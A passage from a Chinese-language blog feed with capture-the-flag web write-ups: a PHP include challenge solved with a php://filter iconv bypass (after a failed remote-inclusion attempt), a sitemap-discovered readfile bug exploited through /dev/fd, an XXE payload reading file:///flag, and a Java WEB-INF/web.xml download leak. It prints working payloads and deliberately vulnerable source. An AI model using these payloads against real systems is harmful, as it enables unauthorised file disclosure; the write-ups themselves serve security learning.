class="variable">$exportSuccess</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$isAdmin</span>) &#123;</span><br><span class="line">        <span class="variable">$exportError</span> = <span class="string">&quot;Access Denied! Only admin users can export files.&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$action</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;export&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$filepath</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;filepath&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$filepath</span>)) &#123;</span><br><span class="line">                <span class="variable">$exportError</span> = <span class="string">&quot;Please specify a file path!&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// Filter dangerous wrappers</span></span><br><span class="line">                <span class="variable">$filepath_lower</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$filepath</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$filepath_lower</span>, <span class="string">&#x27;base64&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="variable">$exportError</span> = <span class="string">&quot;Blocked: base64 filter is not allowed!&quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$filepath_lower</span>, <span class="string">&#x27;rot13&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="variable">$exportError</span> = <span class="string">&quot;Blocked: rot13 filter is not allowed!&quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// Vulnerable to path traversal and PHP filter bypass!</span></span><br><span class="line"></span><br><span class="line">                        <span class="variable">$fileContent</span> = <span class="keyword">include</span>(<span class="variable">$filepath</span>);</span><br><span class="line">                        <span class="variable">$exportSuccess</span> = <span class="string">&quot;File exported successfully: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$filepath</span>);</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>源码都读到了，但是没有任何用处。。。中间尝试远程文件包含木马<code>https://raw.githubusercontent.com/ProbiusOfficial/PHPinclude-labs/main/RFI</code>，报错显示<code>allow_url_include=0</code> 远程文件包含也被禁用了，卡住了</p><p>之后发现可以读取<code>php://filter/convert.iconv.utf-8.utf-16/resource=flag.php</code>，flag放在<code>flag.php</code>里面了。。。。。。什么鬼东西，糖丸了</p><br/><h1 id="极客大挑战20025-Vibe-SEO"><a href="#极客大挑战20025-Vibe-SEO" class="headerlink" title="[极客大挑战20025]Vibe SEO"></a>[极客大挑战20025]Vibe SEO</h1><blockquote><p>“我让 AI 帮我做了搜索引擎优化，它好像说什么『搜索引擎喜欢结构化的站点地图』，虽然不是很懂就是了”</p></blockquote><p>用dirsearch可以扫到<code>sitemap.xml</code></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">urlset</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.sitemaps.org/schemas/sitemap/0.9&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">loc</span>&gt;</span>http://localhost/<span class="tag">&lt;/<span class="name">loc</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">changefreq</span>&gt;</span>weekly<span class="tag">&lt;/<span class="name">changefreq</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">loc</span>&gt;</span>http://localhost/aa__^^.php<span class="tag">&lt;/<span class="name">loc</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">changefreq</span>&gt;</span>never<span class="tag">&lt;/<span class="name">changefreq</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">urlset</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问<code>aa__^^.php</code>，根据报错要GET传入<code>filename</code>参数读取文件，可以利用此处读取<code>aa__^^.php</code>的源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;/my_secret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]) &lt; <span class="number">11</span>) &#123;</span><br><span class="line">  <span class="title function_ invoke__">readfile</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Filename too long&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有长度限制，不够读<code>/my_secret.txt</code>，此处要利用<code>文件描述符</code>读取flag，因为长度限制用<code>dev/fd/</code>目录读取，读到<code>dev/fd/12</code>是<code>aa__^^.php</code>的源码，<code>dev/fd/13</code>是<code>my_secret.txt</code>也就是flag</p><h3 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h3><p>在Unix&#x2F;Linux 系统中，每个进程都有一个“文件描述符表”，用于跟踪该进程打开的所有文件、管道、网络连接等 I&#x2F;O 资源。当你用 <code>fopen()</code>（或其他系统调用如 <code>open()</code>）打开一个新文件时，操作系统会在当前进程的文件描述符表中找到一个空闲的位置分配给该文件，可以通过<code>/proc/self/fd</code>或&#x2F;<code>dev/fd</code>重定向到对应的内核文件对象</p><p>以下函数在对文件进行操作时会产生文件描述符</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.<span class="built_in">open</span>()</span><br><span class="line">os.pipe()</span><br><span class="line">os.dup()</span><br><span class="line">os.dup2()</span><br><span class="line">os.eventfd()  <span class="comment"># Linux</span></span><br><span class="line">socket.socket().fileno()</span><br><span class="line"><span class="built_in">open</span>().fileno()</span><br><span class="line">subprocess.Popen().stdout.fileno()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">fopen</span>()        <span class="comment">// 返回资源，可用fileno()获取fd</span></span><br><span class="line"><span class="title function_ invoke__">fsockopen</span>()</span><br><span class="line"><span class="title function_ invoke__">popen</span>()</span><br><span class="line"><span class="title function_ invoke__">socket_create</span>()</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fd = fs.<span class="title function_">openSync</span>(<span class="string">&#x27;file.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或从Stream获取</span></span><br><span class="line"><span class="keyword">const</span> stream = fs.<span class="title function_">createReadStream</span>(<span class="string">&#x27;file.txt&#x27;</span>);</span><br><span class="line">stream.<span class="property">fd</span>;  <span class="comment">// 如果底层是文件</span></span><br></pre></td></tr></table></figure><br/><h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>又是登陆界面，题目说和XML有关，先看看前端代码，找到了登录逻辑</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&#x27;text/javascript&#x27;</span>&gt; </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">doLogin</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> username = $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line"><span class="keyword">var</span> password = $(<span class="string">&quot;#password&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line"><span class="keyword">if</span>(username == <span class="string">&quot;&quot;</span> || password == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;Please enter the username and password!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data = <span class="string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; </span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;doLogin.php&quot;</span>,</span><br><span class="line">        <span class="attr">contentType</span>: <span class="string">&quot;application/xml;charset=utf-8&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>: data,</span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&quot;xml&quot;</span>,</span><br><span class="line">        <span class="attr">anysc</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">result</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> code = result.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;code&quot;</span>)[<span class="number">0</span>].<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">nodeValue</span>;</span><br><span class="line">        <span class="keyword">var</span> msg = result.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;msg&quot;</span>)[<span class="number">0</span>].<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">nodeValue</span>;</span><br><span class="line">        <span class="keyword">if</span>(code == <span class="string">&quot;0&quot;</span>)&#123;</span><br><span class="line">        $(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(msg + <span class="string">&quot; login fail!&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="string">&quot;1&quot;</span>)&#123;</span><br><span class="line">        $(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(msg + <span class="string">&quot; login success!&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(<span class="string">&quot;error:&quot;</span> + msg);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">XMLHttpRequest,textStatus,errorThrown</span>) &#123;</span><br><span class="line">            $(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(errorThrown + <span class="string">&#x27;:&#x27;</span> + textStatus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>前端把用户输入打包成XML格式传给后端，后端处理后同样返回XML格式的文本，其中的<code>code</code>标签值为<code>0</code>判定登录失败，为<code>1</code>则判定成功</p><p><img src="/img/post/xmlbook.png" alt="return"></p><p>但是这里的重点并不在如何绕过登录验证，而是客户端返回的<code>msg</code>标签，既然它直接用了<code>username</code>标签的内容，那就可以构造外部实体注入</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">svg</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;flag;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span></span><br><span class="line">        123</span><br><span class="line">    <span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后服务器返回的<code>msg</code>标签内的内容就是flag了</p><p>难道真的没人想知道<code>doLogin.php</code>里面写了啥吗？试了直接用<code>file</code>协议会返回空，试试php伪协议，用<code>php://filter/convert.base64-encode/resource=/var/www/html/doLogin.php</code>，把返回的内容解码就能读到后端源码了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$USERNAME</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//账号</span></span><br><span class="line"><span class="variable">$PASSWORD</span> = <span class="string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <span class="comment">//密码</span></span><br><span class="line"><span class="variable">$result</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到账号密码了，能登录成功但是没啥用，当彩蛋玩玩得了</p><br/><h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>最近不是看了点Java嘛，想着找几道Java反序列的题见见世面，结果这题倒是跟反序列没什么关系。主要是有一些处理方式很有必要学学</p><p>打开靶机是一个登录界面，sql注入无果。界面有一个链接指向<code>Download?filename=help.docx</code>，点击会进入一个Java的异常界面</p><p><img src="/img/post/EasyJava1.png" alt="exception"></p><p>不明所以，直接访问<code>/help.docx</code>会下载该文件，里面的内容只有<code>Are you sure the flag is here? ? ?</code>，别无他用，后面查了些资料才知道这里有<code>WEB-INF/web.xml泄露</code></p><p>而且这里利用<code>/Download</code>的正确方式是利用POST请求，比如用POST去访问<code>/Download?filename=help.docx</code>去下载<code>help.docx</code>文件。这里同样的方式去访问<code>/WEB-INF/web.xml</code>获取<code>web.xml</code></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>Index<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.IndexController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Index<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.LoginController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Login<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.DownloadController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Download<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Flag<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>看到<code>FlagController</code>在目录<code>/WEB-INF/classes/com/wm/ctf/FlagController</code>下，相同地下载下来，利用IJ的反编译可以看到源码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(</span></span><br><span class="line"><span class="meta">    name = &quot;FlagController&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagController</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="string">&quot;ZmxhZ3syYWRiOGE2NS03Mzk5LTQwNDEtYmE2Zi00MTY2MDEwNGE2NDR9Cg==&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest var1, HttpServletResponse var2)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getWriter();</span><br><span class="line">        var3.print(<span class="string">&quot;&lt;h1&gt;Flag is nearby ~ Come on! ! !&lt;/h1&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag是经过base64编码的，解码就有了</p><p>闲来无事把<code>LoginController</code>的源码也扒了罢</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(</span></span><br><span class="line"><span class="meta">    name = &quot;Login&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginController</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;admin&quot;</span>.equals(username) &amp;&amp; <span class="string">&quot;admin888&quot;</span>.equals(password)) &#123;</span><br><span class="line">            out.print(<span class="string">&quot;&lt;h1&gt;Flag is not here! &lt;br/&gt;&lt;img src=&#x27;images/img1.jpg&#x27;/&gt;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">            System.out.println(username + <span class="string">&quot; | &quot;</span> + password);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            out.print(<span class="string">&quot;&lt;h1&gt;wrong password!&lt;/h1&gt;&lt;h3&gt;&lt;a href=\&quot;Login\&quot;&gt;Click to log in again!&lt;/a&gt;&lt;/h3&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        request.getRequestDispatcher(<span class="string">&quot;/WEB-INF/resources/index.jsp&quot;</span>).forward(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>哪有什么数据库，登录界面的账号是<code>admin</code>，密码是<code>admin888</code>，登进去肯定没什么用，但看一看也无妨，进去后的页面长这样</p><p><img src="/img/post/EasyJava0.png" alt="login"></p><h3 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF&#x2F;web.xml泄露"></a>WEB-INF&#x2F;web.xml泄露</h3><p>WEB-INF 是Java的web应用的安全目录，正常情况下客户端无法访问，只有服务端可以访问</p><table><thead><tr><th>目录</th><th>描述</th></tr></thead><tbody><tr><td><code>/WEB-INF/web.xml</code></td><td>Web应用程序配置文件，描述了 <code>servlet</code> 和其他的应用组件配置及命名规则</td></tr><tr><td><code>/WEB-INF/classes/</code></td><td>包含所有的 Servlet 类和其他类文件，类文件所在的目录结构与他们的包名称匹配</td></tr><tr><td><code>/WEB-INF/lib/</code></td><td>存放 web 应用需要的各种 jar 文件</td></tr><tr><td><code>/WEB-INF/src/</code></td><td>源码目录，按照包名结构放置各个 java 文件</td></tr><tr><td><code>/WEB-INF/database.properties</code></td><td>数据库配置文件</td></tr><tr><td><code>/WEB-INF/tags/</code></td><td>存放了自定义标签文件</td></tr></tbody></table><br/>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> php </tag>
            
            <tag> XML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaAPI</title>
      <link href="/2025/12/09/JavaAPI/"/>
      <url>/2025/12/09/JavaAPI/</url>
      
